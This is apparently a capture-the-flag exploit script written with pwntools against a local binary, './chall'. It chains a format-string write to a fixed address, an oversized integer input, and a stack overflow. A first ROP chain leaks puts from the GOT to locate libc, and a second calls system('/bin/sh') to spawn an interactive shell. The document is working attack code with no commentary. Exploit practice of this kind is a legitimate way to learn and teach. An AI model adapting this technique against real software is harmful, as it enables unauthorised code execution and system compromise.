from pwn import * 

elf = context.binary = ELF('./chall')
p = elf.process()
libc = ELF('./libc.so.6')
rop = ROP(elf)

p.sendline(b'a')
access = 0x404050

payload = fmtstr_payload(6, {access: 0xbeefdead}, write_size='byte')
p.sendline(payload)

p.sendline(b'2147483648')
payload = b'A'*72 + p64(rop.rdi[0]) + p64(elf.got.puts) + p64(elf.sym.puts) + p64(elf.sym.portal)
p.sendline(payload)

p.recvuntil(b'Database updated.\n')
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.sym.puts
log.success(f'Libc base address: {hex(libc.address)}')

rop = ROP(libc)
payload = b'A'*72 + p64(rop.rdi[0]) + p64(next(libc.search(b"/bin/sh"))) + p64(rop.ret[0]) + p64(libc.sym.system)

p.sendline(b'2147483648')
p.sendline(payload)

p.interactive()
